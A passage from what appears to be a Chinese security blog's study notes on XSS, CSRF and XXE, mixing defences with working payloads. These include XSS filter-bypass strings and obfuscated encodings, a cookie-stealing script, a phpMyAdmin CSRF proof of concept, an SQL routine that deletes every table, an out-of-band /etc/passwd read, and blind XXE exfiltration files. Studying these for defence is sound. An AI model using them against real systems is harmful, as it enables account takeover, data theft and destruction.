ID，还可以通过诱导的方式重置该参数，比如可以通过邮件的方式诱导用户去点击重置Session ID的URL，使用Cookie传递可以避免这种攻击.使用Cookie来存放Session ID，攻击者可以在以下三种可用的方法中选择一种来重置Session ID。 1.使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如document.cookie=”sessionid=123”，这种方式可以采用跨站脚本攻击来达到目的。防御方式可以是设置HttpOnly属性，但有少数低版本浏览器存在漏洞，即使设置了HttpOnly，也可以重写Cookie。所以还需要加其他方式的校验，如User-Agent验证，Token校验等同样有效。2.使用HTML的\\标签加Set-Cookie属性。服务器可以靠在返回的HTML文档中增加\\标签来设置Cookie。例如，与客户端脚本相比，对\\标签的处理目前还不能被浏览器禁止。3.使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部。 1.6 会话劫持防御方法1.用户登录时生成新的Session ID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。2.大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。3.更改session的名称：session的默认名称是PHPSESSID,此变量会保存在cookie中，如果黑客不抓包分析，就不能猜到这个名称，阻挡部分攻击。 1.7 JavaScript 事件 事件 描述 onabort 图像加载被中断 onblur 元素失去焦点 onchange 用户改变域的内容 onclick 鼠标单击HTML元素 ondblclick 鼠标双击HTML对象 onerror d当加载文档或图像时发生某个错误 onmouseover 用户再一个HTML元素上移动鼠标 onmouseout 用户从一个HTML元素上移开鼠标 onkeydown 某个键盘的键被按下 onkeypress 某个键盘的键被按下或按住 onkeyup 某个键盘的键被松开 onload 浏览器已完成页面的加载 onmousedown 某个鼠标按键被按下 onmousemove 鼠标被移动 onmouseup 某个鼠标按键被松开 onreset 重置按钮被点击 onresize 窗口或框架被调整尺寸 onselect 文本被选定 onsubmit 提交按钮被点击 onunload 用户退出页面 2. XSS分类2.1 反射型XSS反射型跨站脚本也称作非持久型、参数型跨站脚本。这类型的脚本是最常见的，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中。一般使用的将构造好的URL发给受害者，受害者点击触发，而且只执行一次，非持久化。 2.2 存储型XSS存储型XSS比反射型跨站脚本更具威胁性，并且可能影响到web服务器的自身安全。此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先将恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。 2.3 DOM型XSS简单去理解就是因为他输出点在DOM，将用户提交的参数(恶意代码)拿过来拼接HTML代码，利用可编辑的文档对象去自动生成HTML代码，让浏览器解析，达到攻击的目的 利用思想：1.在标签内部构造出恶意代码2.标签闭合 让恶意代码逃逸出来 注意：无论反射型还是存储型，都是需要与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码，因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。 From：浅谈跨站脚本攻击与防御 3. 漏洞挖掘3.1 FireFox中常用XSS调试插件Hackbar、Firebug、Tamper Data、Live HTTP Headers、Editor Cookie 3.2 手工挖掘闭合标签 1234567&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;img/src=@onerror=alert(1)/&gt;&quot;&gt;&lt;img/src=@onerror=alert(1)/&gt;&apos;onmouseover=alert(1) x=&apos;javascript:alert(1)//&quot;;alert(1)// 3.2.1 数据交互的地方登录、留言板、评论、搜索测试用户输入的地方、文件上传的地方、flash 3.3 工具挖掘awvs、netsparke、appscan、burp、xsser、xsscrapy、brutexssr、OWASP Xenotix 4. XSS的危害1.网络钓鱼，包括盗取各类的用户账号2.窃取用户cookie3.窃取用户浏览会话4.强制弹出广告页面、刷流量5.网页挂马6.提升用户权限，进一步渗透网站7.传播跨站脚本蠕虫 5. 防御XSS5.1 转义htmlspecialchars()函数把一些预定义的字符转换为HTML实体。预定义字符： 12345&amp; （和号）成为 &amp;amp;&quot; （双引号）成为 &amp;quot;&apos; （单引号）成为 &amp;#39&lt; （小于）成为 &amp;lt;&gt; （大于）成为 &amp;gt; 5.2 HTTPOnly在php.ini中设置 1session.cookie_httponly = Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为： 1234&lt;?php setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); ?&gt; 5.3 输入过滤（1）验证输入 比如一个输入框，需要我们输入电话号码，电话号码必须是数字格式，有一定的长度，可以使用正则匹配 reg = /^020-\\d{8}$/ 常见的检测和过滤： 输入是否仅仅包含合法的字符 输入字符串是否超过最大限度 输入如果为数字，数字是否在指定的范围内 pentest@163.com—&gt;规则 输入是否符合特殊格式要求，如E-mail地址、IP地址等 （2）采用黑名单过滤敏感字符 1&lt; &gt; &apos; &quot; &amp; # javascript expression a img script 注意，对用户输入的数据，不能仅仅在客户端使用JS进行验证，需要在服务器端进行验证检测。 5.4 输出过滤对html字符，比如&lt;&gt;&amp;”等进行编码和转义 很多程序语言退出相应的程序库，可以协助程序开发者针对html输出，如ASP的Server.HTMLEncode()函数、ASP.NET的Server.HtmlEncode()函数、PHP的htmlspecialchars()函数 5.5 限制标签使用控制用户可以使用的标签，只能使用一些安全的标签，如\\、\\等。 5.6 防XSS代码12$x=preg_replace(&quot;/script/i&quot;,&quot;&quot;,$x);$x=preg_replace(&quot;/alert/i&quot;,&quot;&quot;,$x); 5.7 内容安全策略Content Security Policy, CSP内容安全策略是防御XSS攻击的一种安全机制，其思想是以服务器白名单的形式来配置可信的内容来源，客户端Web应用代码可以使用这些安全来源。Cisco研究人员找到了绕过CSP的一种方法，攻击者可以利用这种方法，注入被禁止的代码，从而窃取隐私数据。 6. 综合利用6.1 Cookie获取6.1.1 反射型XSS的Cookie获取将XSS发送给登录用户，使其点击将URL写在图片中，更加隐蔽 1&lt;img src=&quot;URL&quot;&gt; 6.1.2 存储型XSS的Cookie获取留言板 闭合文本域 6.1.3 HTTP-Only启用时获取CookieJavaScript代码接受PHP 6.1.4 编写接收Cookie代码123456789101112&lt;script&gt; var cookie=document.cookie; var url=&quot;http://127.0.0.1/cookie.php?x=&quot;; windows.location.href=url+cookie;&lt;/script&gt;&lt;?php $cookie=$_GET[&apos;x&apos;] $file=fopen(&quot;cookie.txt&quot;,&quot;w+&quot;); fwrite($file,$cookie); fclose($file);?&gt; 6.2 上传型xss1&lt;script&gt;alert(/xss/)&lt;/script&gt;.jpg 访问图片时会触发，需要闭合标签 6.3 通过XSS留后门在管理页面中插入xss获取cookie，每次管理员登录都可以获取cookie需要获得webshell 7. Payload1234567891&apos; onclick=alert(1) //1&apos;&gt;&lt; img src=# onerror=alert(1)&gt;//&apos;&gt;&lt;svg &lt;/onload =&quot;1&gt; (_=prompt,_(1)) &quot;&quot;&gt;&lt;a&apos;&apos;&gt;&lt;details open ontoggle=confirm()&gt;&lt;a&apos;&quot;&apos;/&gt; &lt;svg/onload=alert(1)///&gt;&lt; img src=# onerror=alert(1)/&gt;//&quot;&quot;&apos; onmouseover=&quot;alert(1)&quot;&apos;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;&lt; a href=&apos; &apos; onclick=alert(1) // &apos;&gt;testLink&lt;/ a&gt; 8. XSS Payload绕过8.1 大小写1&lt;ScRiPt&gt;alert(/xss/)&lt;/ScRiPt&gt; 8.2 重复写1&lt;scr&lt;script&gt;ipt&gt; 8.3 使用javascript伪协议1&lt;img src=&quot;javascritp:alert(/xss/);&quot;&gt; 8.4 使用空格、回车、tab123&lt;img src=&quot;javasCript:Alert(/xss/)&quot;&gt; 8.5 双引号改单引号1&lt;img src=&apos;javascript:alert(/xss/);&apos;&gt; 8.6 利用JavaScript事件1&lt;img src=x onmouseover=&quot;alert(/xss)&quot;&gt; 8.7 拆分12345678910&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos; src=ht&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;tp://ww&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;w.shell&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;.net/1.&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;ript&gt;&quot;)&apos;&lt;/script&gt;&lt;script&gt;eval_r(z)&lt;/script&gt; 8.8 css中构造XSS Payload123&lt;div style=&quot;list-style-image:url(javascript:alert(&apos;/xss/&apos;))&quot;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;http://www.xss.com/attack.css&quot;&gt;//在http://www.xss.com/attack.css中插入恶意代码 8.9 字符编码8.9.1 URL编码1%3Cimg%20src%3Dx%20onerror%3Dalert(/xss/)%3e 8.9.2 HTML实体编码12345&lt; &gt;//十进制&amp;#60; &amp;#62;//Hex&amp;#x3c; &amp;#x3e; 8.9.3 Hex配合eval()使用 1&lt;img src=x onerror=eval(&quot;\\x61\\x6C\\x65\\x72\\x74\\x28\\x2F\\x78\\x73\\x73\\x2F\\x29&quot;)&gt; 8.9.4 十进制Ascii码配合String.fromCharCode())使用 1&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&lt;/script&gt; 8.9.5 八进制1&lt;img src=x onerror=eval(&quot;\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51&quot;)&gt; 8.9.6 Unicode1&lt;img src=x onerror=eval(&quot;\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u002F\\u0078\\u0073\\u0073\\u002F\\u0029&quot;)&gt; 8.9.7 jsfuckalert(/xss/) 1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 8.9.8 aaencodealert(/xss/) 1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;); 9. XSS练习1.prompt(1) to win 2.alert(1) to win 3.先知社区xss挑战 10. XSS平台BeEFXSS Exploit 框架 XenotixBlueLotusXSS_PlatformXSSerXSSpt11. 参考[1] 浅谈跨站脚本攻击与防御 [2] 跨站的艺术-XSS入门与介绍 [3] aaencode demo [4] http://www.jsfuck.com","categories":[],"tags":[]},{"title":"'Cross-Domain'","slug":"Cross-Domain","date":"2019-05-09T11:28:36.000Z","updated":"2019-05-11T03:24:07.657Z","comments":true,"path":"2019/05/09/Cross-Domain/","link":"","permalink":"https://chirec.github.io/2019/05/09/Cross-Domain/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"'CSRF'","slug":"CSRF","date":"2019-05-09T11:27:33.000Z","updated":"2019-05-14T03:34:31.705Z","comments":true,"path":"2019/05/09/CSRF/","link":"","permalink":"https://chirec.github.io/2019/05/09/CSRF/","excerpt":"CSRF（Cross Site Request Forgery, 跨站请求伪造）是一种网络的攻击方式，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF。CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。","text":"CSRF（Cross Site Request Forgery, 跨站请求伪造）是一种网络的攻击方式，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF。CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。 条件1.正常用户需要登录站点2.攻击者需要知道站点请求内容(构造恶意请求)3.需要正常用户在登录成功的浏览器中诱导点击恶意链接4.服务器无验证或验证不严谨 自动提交12setTimeout(&quot;document.form.submit&quot;,1000)编写脚本，包含document.form.submit 复现phpmyadmin 4.7.x CSRF漏洞 修改密码1234set password=password(&apos;&apos;)http://192.168.11.200/phpMyAdmin-4.7.4/sql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password%20=%20PASSWORD(%27123%27)&lt;p&gt;hello world&lt;/p&gt;&lt;img src=&quot;http://192.168.11.200/phpMyAdmin-4.7.4/sql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password%20=%20PASSWORD(%27123%27)&quot; style=&quot;display: none;&quot;&gt; 写文件12show variables like &apos;%secure_file_priv%&apos;;select &quot;&quot; into outfile &apos;/var/&apos;; 读文件12select load_file();select load_file(concat(&apos;\\\\\\\\&apos;,(select load_file(&apos;/etc/passwd&apos;)),&apos;.mysql.jjj.ceye.io\\\\abc&apos;)); 需要使用OOB 删库完整SQL语句 123456789101112DROP PROCEDURE IF EXISTS EMPT;DELIMITER $$ CREATE PROCEDURE EMPT() BEGIN DECLARE i INT; SET i = 0; WHILE i &lt; 100 DO SET @del = (SELECT CONCAT(&apos;DELETE FROM &apos;,TABLE_SCHEMA,&apos;.&apos;,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE &apos;%_schema&apos; and TABLE_SCHEMA!=&apos;mysql&apos; LIMIT i,1); PREPARE STMT FROM @del; EXECUTE STMT; SET i = i +1; END WHILE; END $$DELIMITER ;CALL EMPT(); POC 1DROP+PROCEDURE+IF+EXISTS+EMPT%3B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%3B%0A++++++++SET+i+%3D+0%3B%0A++++++++WHILE+i+%3C+100+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%2C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+and+TABLE_SCHEMA%21%3D%27mysql%27+LIMIT+i%2C1%29%3B%0A++++++++++++PREPARE+STMT+FROM+%40del%3B%0A++++++++++++EXECUTE+stmt%3B%0A++++++++++++SET+i+%3D+i+%2B1%3B%0A++++++++END+WHILE%3B%0A++++END+%24%24%0ADELIMITER+%3B%0A%0ACALL+EMPT%28%29%3B%0A CSRF高危触发点论坛交流用户中心反馈留言交易管理后台管理 CSRF漏洞危害CSRF漏洞会导致受害人在不知情的情况下向论坛发帖子、订阅邮件列表、网购或股票交易，或变更用户名或口令。对受到防火墙保护的所有web应用程序而言，CSRF攻击都能绕过防火墙攻击web应用。CSRF漏洞还可以和XSS等漏洞结合使用，从而进一步加大了该漏洞的危害。CSRF+XXECSRF+LFICSRF+XSS 伪造HTTP请求进行未授权操作篡改、盗取目标网站上的重要用户数据未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等如果通过使用社工等方式攻击网站管理员，会危害网站本身的安全性 作为其他攻击向量的辅助攻击手法，比如配合XSS 传播CSRF蠕虫 CSRF防御1.Referrer验证2. Token验证3. 用户身份验证绑定邮箱、手机验证码","categories":[],"tags":[]},{"title":"'XXE'","slug":"XXE","date":"2019-05-09T11:21:39.000Z","updated":"2019-05-12T14:12:41.959Z","comments":true,"path":"2019/05/09/XXE/","link":"","permalink":"https://chirec.github.io/2019/05/09/XXE/","excerpt":"XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。","text":"XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。 1. XML基础1.1 XML结构XML由3部分构成，XML声明，文档定义(Document Type Definition,DTD)，文档元素。 1234567891011121314151617&lt;!--XML申明--&gt;&lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Windy&lt;/to&gt;&lt;from&gt;Andy&lt;/from&gt;&lt;head&gt;Greeting&lt;/head&gt;&lt;body&gt;Long time no see!&lt;/body&gt;&lt;/note&gt; 1.2 DTD1.2.1 DTD文档形式1.2.1.1 内部DTD文档1&lt;!DOCTYPE 根元素 [定义内容]&gt; 1.2.1.2 外部DTD文档1&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt; 1.2.1.3 混合类型1&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt; 1.2.2 实体类别1.2.2.1 内部普通实体1&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt; 1.2.2.2 外部普通实体1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot; 1.2.2.3 内部参数实体1&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt; 1.2.2.4 外部参数实体1&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt; 1.2.2 Example1234567&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY data SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt; &lt;data&gt;&amp;data;&lt;/data&gt;&lt;/root&gt; 普通实体使用&amp;实体名;来进行引用；参数实体只能在定义种出现。 2. 漏洞利用2.1 读取任意文件2.1.1 探测XXE漏洞以bWAPP的XXE漏洞为例 抓包发现，返回数据格式是xml格式 Payload 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY data SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;data;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 2.2 URL请求2.2.1 Blind XXE在某些情况下，即使存在XXE漏洞，服务器并不会将数据回显。这种情况下，使用外带数据(Out Of Band, OOB)依然可以获得数据。 test.php 模拟具有XXE漏洞的站点，搭建在靶机上 123456&lt;?php $xml = $_POST['xml']; $data = @simplexml_load_string($xml); echo \"&lt;pre&gt;\"; @print_r($data);?&gt; XXE_OOB.php 用来接收带外数据的页面，由攻击者搭建 123456&lt;?php $xxe = $_GET['xxe']; $log = fopen('xxe.txt','a+'); fwrite($log,$xxe); fclose($log);?&gt; evil.dtd 恶意DTD，由攻击者构造 1&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost:8000/Blind_XXE/XXE_OOB.php?xxe=%file;&apos;&gt;&quot;&gt;%all; test.txt 用来存放带外数据的文本文档 1hello! payload 恶意请求 1234567xml=&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY[ 